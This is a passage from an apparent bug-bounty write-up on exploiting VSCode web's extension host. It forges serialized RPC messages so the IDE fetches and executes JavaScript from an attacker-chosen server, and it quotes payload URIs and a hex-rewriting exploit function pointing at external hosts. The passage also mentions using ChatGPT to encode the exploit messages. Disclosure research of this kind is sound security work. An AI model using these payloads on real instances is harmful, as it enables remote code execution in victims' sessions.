    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Data saved to file</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Example app listening on port 3000!</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">});</span>

</code></pre></div></div>

<p>In message.txt from my local VSCode web instance, I could again see nothing related to extension calls like it was in Gitlab which was cool as it made it similar to IDX case.</p>

<p>From the minified Gitlab poc we are aware of the important request messages which we need to sent, the payload to make it fetch the extension url from our server</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$startExtensionHost &gt;
$activateByEvent &gt;
$initializeWorkspace &gt;

[...]
O{"$mid":1,"path":"/1.js","scheme":"https","authority":"sudistark.github.io"}
</code></pre></div></div>

<p>First I will ensure if I am able to reach the <code class="language-plaintext highlighter-rouge">$startExtensionHost</code> method or not with the message.txt file and yeah it seemed to work. Next goal was to add the <code class="language-plaintext highlighter-rouge">$activateByEvent</code> message which is sent just after the <code class="language-plaintext highlighter-rouge">$startExtensionHost</code>.</p>

<p>I copied this from Github:
<em>onStartupFinished</em> is registered by the Merge Conflict extension</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$activateByEvent,["onStartupFinished",0]
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725182206.png" alt="Pasted image 20250725182206.png" />
<br />
After this it should call the code block which is responsible for fetching the extension source.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="k">async</span> <span class="nf">vb</span><span class="p">(</span><span class="nx">$</span><span class="p">,</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">v</span> <span class="o">=</span> <span class="nx">v</span><span class="p">.</span><span class="nf">with</span><span class="p">({</span>
                        <span class="na">path</span><span class="p">:</span> <span class="nc">S</span><span class="p">(</span><span class="nx">v</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="dl">"</span><span class="s2">.js</span><span class="dl">"</span><span class="p">)</span>
                    <span class="p">});</span>
                    <span class="kd">const</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">$</span><span class="p">?.</span><span class="nx">identifier</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
                    <span class="nx">o</span> <span class="o">&amp;&amp;</span> <span class="nx">performance</span><span class="p">.</span><span class="nf">mark</span><span class="p">(</span><span class="s2">`code/extHost/willFetchExtensionCode/</span><span class="p">${</span><span class="nx">o</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                    <span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">I</span><span class="p">.</span><span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">C</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">v</span><span class="p">))</span>
                      <span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">));</span>
</code></pre></div></div>

<p>Beautifed source:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">protected</span> <span class="k">async</span> <span class="nx">_loadCommonJSModule</span><span class="o">&lt;</span><span class="nx">T</span> <span class="kd">extends</span> <span class="nx">object</span> <span class="o">|</span> <span class="kc">undefined</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">extension</span><span class="p">:</span> <span class="nx">IExtensionDescription</span> <span class="o">|</span> <span class="kc">null</span><span class="p">,</span> <span class="nx">module</span><span class="p">:</span> <span class="nx">URI</span><span class="p">,</span> <span class="nx">activationTimesBuilder</span><span class="p">:</span> <span class="nx">ExtensionActivationTimesBuilder</span><span class="p">):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="p">{</span>
		<span class="nx">module</span> <span class="o">=</span> <span class="nx">module</span><span class="p">.</span><span class="nf">with</span><span class="p">({</span> <span class="na">path</span><span class="p">:</span> <span class="nf">ensureSuffix</span><span class="p">(</span><span class="nx">module</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="dl">'</span><span class="s1">.js</span><span class="dl">'</span><span class="p">)</span> <span class="p">});</span>
		<span class="kd">const</span> <span class="nx">extensionId</span> <span class="o">=</span> <span class="nx">extension</span><span class="p">?.</span><span class="nx">identifier</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">extensionId</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">performance</span><span class="p">.</span><span class="nf">mark</span><span class="p">(</span><span class="s2">`code/extHost/willFetchExtensionCode/</span><span class="p">${</span><span class="nx">extensionId</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="c1">// First resolve the extension entry point URI to something we can load using `fetch`</span>
		<span class="c1">// This needs to be done on the main thread due to a potential `resourceUriProvider` (workbench api)</span>
		<span class="c1">// which is only available in the main thread</span>
		<span class="kd">const</span> <span class="nx">browserUri</span> <span class="o">=</span> <span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">_mainThreadExtensionsProxy</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">module</span><span class="p">));</span>
		<span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">browserUri</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="kc">true</span><span class="p">));</span>
</code></pre></div></div>

<p>I started stepping in the <code class="language-plaintext highlighter-rouge">activateByEvent</code> only and found that <code class="language-plaintext highlighter-rouge">n</code> is empty, there is nothing returned from the <code class="language-plaintext highlighter-rouge">getExtensionDescriptionsForActivationEvent</code> method as well. Based on the name it‚Äôs clear this gets the extension details based on the provided event eg: <code class="language-plaintext highlighter-rouge">onStartupFinished</code></p>

<p>Stepping in , turns out <code class="language-plaintext highlighter-rouge">this.h</code> is null ah</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="nf">getExtensionDescriptionsForActivationEvent</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">const</span> <span class="nx">i</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">h</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nx">i</span> <span class="p">?</span> <span class="nx">i</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">:</span> <span class="p">[]</span>
                <span class="p">}</span>
</code></pre></div></div>

<p>Looking to the beautified source:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">public</span> <span class="nf">getExtensionDescriptionsForActivationEvent</span><span class="p">(</span><span class="nx">activationEvent</span><span class="p">:</span> <span class="nx">string</span><span class="p">):</span> <span class="nx">IExtensionDescription</span><span class="p">[]</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">extensions</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_activationMap</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">activationEvent</span><span class="p">);</span>
		<span class="k">return</span> <span class="nx">extensions</span> <span class="p">?</span> <span class="nx">extensions</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">:</span> <span class="p">[];</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>I traced where <code class="language-plaintext highlighter-rouge">_activationMap</code> is used turns out there are two messages that could affect this the first one is that long ass json which we sent as the initial message which contains all the extension data and the other one is <code class="language-plaintext highlighter-rouge">$startExtensionHost</code> which if we look carefully seems to contain extensions details too with fields like</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725215613.png" alt="Pasted image 20250725215613.png" />
<br />
I quickly checked the same with Gitlab and noticed <code class="language-plaintext highlighter-rouge">myToRemove</code> property is actually empty in case of Gitlab</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729092533.png" alt="Pasted image 20250729092533.png" />
Fig: from my notes</p>

<p>The simple solution for this was to set the <code class="language-plaintext highlighter-rouge">myToRemove</code> property to an empty array at runtime in the <code class="language-plaintext highlighter-rouge">startExtensionHost</code> method we can try it out (I don‚Äôt remember what all happened here but I did followed a lot of rabbit holes untill I found I needed to do this simple thing )</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">z</span><span class="p">.</span><span class="nx">myToRemove</span><span class="o">=</span><span class="p">[]</span>
</code></pre></div></div>

<p>If it still didn‚Äôt had worked then I would have to replace the first message as it might be the case that it doesn‚Äôt contains any extension with that specified activation event.</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725220516.png" alt="Pasted image 20250725220516.png" /></p>

<p>Now you can see <code class="language-plaintext highlighter-rouge">this.h</code> is populated, it contains event as the key and in value a list of extensions which supports it.</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725220848.png" alt="Pasted image 20250725220848.png" /></p>

<p>After this it was all good it was reaching the <code class="language-plaintext highlighter-rouge">_loadCommonJSModule</code> method</p>

<p>Now all the magic happens here:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">browserUri</span> <span class="o">=</span> <span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">_mainThreadExtensionsProxy</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">module</span><span class="p">))</span>
</code></pre></div></div>

<p>The value returned by the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> is used in the next line to make a fetch call and later gets executed.</p>

<p>This is where I started to get the real PAIN</p>

<center><img src="/tmp/cdn-images/tenor.gif" alt="tenor.gif" /></center>

<p>Stepping in to the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> call</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nx">_createProxy</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">debugName</span><span class="p">:</span> <span class="nx">string</span><span class="p">):</span> <span class="nx">T</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">handler</span> <span class="o">=</span> <span class="p">{</span>
			<span class="na">get</span><span class="p">:</span> <span class="p">(</span><span class="na">target</span><span class="p">:</span> <span class="nx">any</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="nx">PropertyKey</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">name</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">name</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">===</span> <span class="nx">CharCode</span><span class="p">.</span><span class="nx">DollarSign</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="p">(...</span><span class="na">myArgs</span><span class="p">:</span> <span class="nx">any</span><span class="p">[])</span> <span class="o">=&gt;</span> <span class="p">{</span>
						<span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nf">_remoteCall</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">myArgs</span><span class="p">);</span>
					<span class="p">};</span>
				<span class="p">}</span>
				<span class="k">if </span><span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="nx">_RPCProxySymbol</span><span class="p">)</span> <span class="p">{</span>
					<span class="k">return</span> <span class="nx">debugName</span><span class="p">;</span>
				<span class="p">}</span>
				<span class="k">return</span> <span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">};</span>
		<span class="k">return</span> <span class="k">new</span> <span class="nc">Proxy</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="kc">null</span><span class="p">),</span> <span class="nx">handler</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729131301.png" alt="Pasted image 20250729131301.png" />
<br />
The <code class="language-plaintext highlighter-rouge">rpcId</code> correspond to the rpc method each method has a unique <code class="language-plaintext highlighter-rouge">rpcId</code>, as we are talking about <code class="language-plaintext highlighter-rouge">rpcId</code> I will explain one more thing here which I mentioned in my starting of the blogpost</p>

<blockquote>

  <p>After setting up the VSCode web server up , if we pass the same hex data in this. The breakpoint doesn‚Äôt hits not even for the <code class="language-plaintext highlighter-rouge">initializeConfiguration</code> .Based on this it seemed each instance have it‚Äôs own configuration the important thing is in the very first message that long ass json value (I will explain the exact root cause later which I figured out while writing this blogpost, for the time being just follow along).</p>
</blockquote>

<p>Below I will explain how the message which we are sending through the port are being handled by VSCode.</p>

<p>The raw messages are being handled here as they are in buffer format</p>

<p>Example message:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x01\x00\x00\x00\x02H\x18$initializeConfiguration\x00\x01I\x05[{"defaults":{"contents":{"editor":{"tabSize":4,"inde
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">messageType</code> and <code class="language-plaintext highlighter-rouge">req</code> values decides how the buffer message is going to be parsed and handled, these values are retrieved from those hex escape sequences which you can see in the example message above:</p>

<p>What we are sending is actually serialized RPC messages which  VSCode will deserialized and use accordingly</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_receiveOneMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">:</span> <span class="nx">VSBuffer</span><span class="p">):</span> <span class="k">void</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_isDisposed</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="kd">const</span> <span class="nx">msgLength</span> <span class="o">=</span> <span class="nx">rawmsg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">;</span>
		<span class="kd">const</span> <span class="nx">buff</span> <span class="o">=</span> <span class="nx">MessageBuffer</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">messageType</span> <span class="o">=</span> <span class="o">&lt;</span><span class="nx">MessageType</span><span class="o">&gt;</span><span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt8</span><span class="p">();</span>
		<span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt32</span><span class="p">();</span>

		<span class="k">switch </span><span class="p">(</span><span class="nx">messageType</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">case</span> <span class="nx">MessageType</span><span class="p">.</span><span class="na">RequestJSONArgs</span><span class="p">:</span>
			<span class="k">case</span> <span class="nx">MessageType</span><span class="p">.</span><span class="na">RequestJSONArgsWithCancellation</span><span class="p">:</span> <span class="p">{</span>
				<span class="kd">let</span> <span class="p">{</span> <span class="nx">rpcId</span><span class="p">,</span> <span class="nx">method</span><span class="p">,</span> <span class="nx">args</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">deserializeRequestJSONArgs</span><span class="p">(</span><span class="nx">buff</span><span class="p">);</span>
				<span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_uriTransformer</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">args</span> <span class="o">=</span> <span class="nf">transformIncomingURIs</span><span class="p">(</span><span class="nx">args</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">_uriTransformer</span><span class="p">);</span>
				<span class="p">}</span>
				<span class="k">this</span><span class="p">.</span><span class="nf">_receiveRequest</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">rpcId</span><span class="p">,</span> <span class="nx">method</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="p">(</span><span class="nx">messageType</span> <span class="o">===</span> <span class="nx">MessageType</span><span class="p">.</span><span class="nx">RequestJSONArgsWithCancellation</span><span class="p">));</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
<span class="p">[...]</span>
<span class="p">[...]</span>
</code></pre></div></div>

<p>You can see example values here:
<img src="/tmp/cdn-images/Pasted%20image%2020250729133341.png" alt="Pasted image 20250729133341.png" />
<br /></p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_receiveRequest</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">req</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">method</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[],</span> <span class="nx">usesCancellationToken</span><span class="p">:</span> <span class="nx">boolean</span><span class="p">):</span> <span class="k">void</span> <span class="p">{</span>
        
        <span class="p">[...]</span>
		<span class="p">[...]</span>
		
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="c1">// cannot be cancelled</span>
			<span class="nx">promise</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">_invokeHandler</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">,</span> <span class="nx">method</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">_invokeHandler</code> method is responsible for invoking that method as the name suggest.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_invokeHandler</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">any</span><span class="o">&gt;</span> <span class="p">{</span>
		<span class="k">try</span> <span class="p">{</span>
			<span class="k">return</span> <span class="nb">Promise</span><span class="p">.</span><span class="nf">resolve</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">_doInvokeHandler</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">,</span> <span class="nx">args</span><span class="p">));</span>
		<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span> <span class="nb">Promise</span><span class="p">.</span><span class="nf">reject</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_doInvokeHandler</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]):</span> <span class="nx">any</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">actor</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_locals</span><span class="p">[</span><span class="nx">rpcId</span><span class="p">];</span>
		<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">actor</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unknown actor </span><span class="dl">'</span> <span class="o">+</span> <span class="nf">getStringIdentifierForProxy</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">));</span>
		<span class="p">}</span>
		<span class="kd">const</span> <span class="nx">method</span> <span class="o">=</span> <span class="nx">actor</span><span class="p">[</span><span class="nx">methodName</span><span class="p">];</span>
		<span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">method</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">function</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unknown method </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">methodName</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> on actor </span><span class="dl">'</span> <span class="o">+</span> <span class="nf">getStringIdentifierForProxy</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">));</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="nx">method</span><span class="p">.</span><span class="nf">apply</span><span class="p">(</span><span class="nx">actor</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">rpcId</code> which is extracted using the deserialized method , is used to retrieve an index value from the <code class="language-plaintext highlighter-rouge">this._locals</code> array you can consider this array stores a reference to all of the available rpc methods which could be called.</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729133749.png" alt="Pasted image 20250729133749.png" />
<br />
As discussed each VSCode instance might have different configurations because of which the <code class="language-plaintext highlighter-rouge">rpcId</code> for the same method might be in a different index but as we copied the message from somewhere else the <code class="language-plaintext highlighter-rouge">rpcId</code> doesn‚Äôt matches with the method we are trying to call which makes it throw an error.</p>

<p>To solve this we need to find the correct index value aka <code class="language-plaintext highlighter-rouge">rpcId</code> at which that method exists</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729135636.png" alt="Pasted image 20250729135636.png" />
<br />
For <code class="language-plaintext highlighter-rouge">$initializeConfiguration</code> method the <code class="language-plaintext highlighter-rouge">rpcId</code> is calculated from our serialized message is 72 but using the below code we found that it actually exists on the index 73</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Had to write this manually as AI was fucking around</span>

<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">test</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>    
    <span class="k">try</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">test</span> <span class="o">&amp;&amp;</span> <span class="nx">test</span><span class="p">[</span><span class="nx">U</span><span class="p">])</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Success </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Similarly if I had wanted to make changes to the arbitrary domain where the extension location is fetched from</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\t\x00\x00\x00\x11\x00\x00\x00O{"$mid":1,"path":"/gl/editor/include.js","scheme":"https","authority":"peo.si"}'
</code></pre></div></div>

<p>I remember last year when I was trying to exploit, I had no idea how fix the length after decoded all I could understand that the front bytes holds some meaning <code class="language-plaintext highlighter-rouge">\x01\x00\x00\x00\x112\r</code></p>

<p>So what I did was at that time is to ask Chatgpt. I provided the decoded and encoded version and asked to handle it and it did worked.</p>

<p>Btw here‚Äôs how @joaxcar did it to make modifications to the script src:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">async</span> <span class="kd">function</span> <span class="nf">send_everything</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s2">`{"$mid":1,"path":"/gitlab/staging/xss/staging-include.js","scheme":"https","authority":"joaxcar.com"}`</span>
        <span class="kd">const</span> <span class="nx">encodedPayload</span> <span class="o">=</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nf">encode</span><span class="p">(</span><span class="nx">payload</span><span class="p">))</span>
        <span class="kd">const</span> <span class="nx">lengthPayload</span> <span class="o">=</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">length</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> 
        <span class="kd">const</span> <span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="dl">"</span><span class="s2">staging_send_hex.txt</span><span class="dl">"</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">617b22246d6964223a312c2270617468223a222f6769746c61622f73746167696e672f73746167696e672d696e636c7564652e6a73222c22736368656d65223a226874747073222c22617574686f72697479223a226a6f61786361722e636f6d227d</span><span class="dl">"</span><span class="p">,</span> <span class="nx">lengthPayload</span> <span class="o">+</span> <span class="nx">encodedPayload</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
</code></pre></div></div>

<p>And the Chatgpt way:</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250727200920.png" alt="Pasted image 20250727200920.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250727201244.png" alt="Pasted image 20250727201244.png" />
<img src="/tmp/cdn-images/Pasted%20image%2020250727201318.png" alt="Pasted image 20250727201318.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250727201353.png" alt="Pasted image 20250727201353.png" />
<img src="/tmp/cdn-images/Pasted%20image%2020250727201439.png" alt="Pasted image 20250727201439.png" />
<br />
<br />
<a href="https://chatgpt.com/share/68863b8c-2584-8000-88ce-08463fb169c2">https://chatgpt.com/share/68863b8c-2584-8000-88ce-08463fb169c2</a> if you are interested you can read it here I made it public, it‚Äôs the real chat back from the time when I was trying to exploit it.</p>

<p>All the messages which we are sending are basically serialized RPC messages, VSCode uses such all throughout their application for communicating through different parts such as the Language server, extensions,etc</p>

<p>You can see the messages how they are decoded and handled starting from here: <a href="https://github.com/microsoft/VSCode/blob/b59f40f0605eb6835e0af9c3716cf5f46c5ef241/src/vs/workbench/services/extensions/common/rpcProtocol.ts#L783">https://github.com/microsoft/VSCode/blob/b59f40f0605eb6835e0af9c3716cf5f46c5ef241/src/vs/workbench/services/extensions/common/rpcProtocol.ts#L783</a></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">public</span> <span class="kd">static</span> <span class="nf">deserializeRequestJSONArgs</span><span class="p">(</span><span class="nx">buff</span><span class="p">:</span> <span class="nx">MessageBuffer</span><span class="p">):</span> <span class="p">{</span> <span class="nl">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">;</span> <span class="nl">method</span><span class="p">:</span> <span class="nx">string</span><span class="p">;</span> <span class="nl">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]</span> <span class="p">}</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">rpcId</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt8</span><span class="p">();</span>
		<span class="kd">const</span> <span class="nx">method</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readShortString</span><span class="p">();</span>
		<span class="kd">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readLongString</span><span class="p">();</span>
		<span class="k">return</span> <span class="p">{</span>
			<span class="na">rpcId</span><span class="p">:</span> <span class="nx">rpcId</span><span class="p">,</span>
			<span class="na">method</span><span class="p">:</span> <span class="nx">method</span><span class="p">,</span>
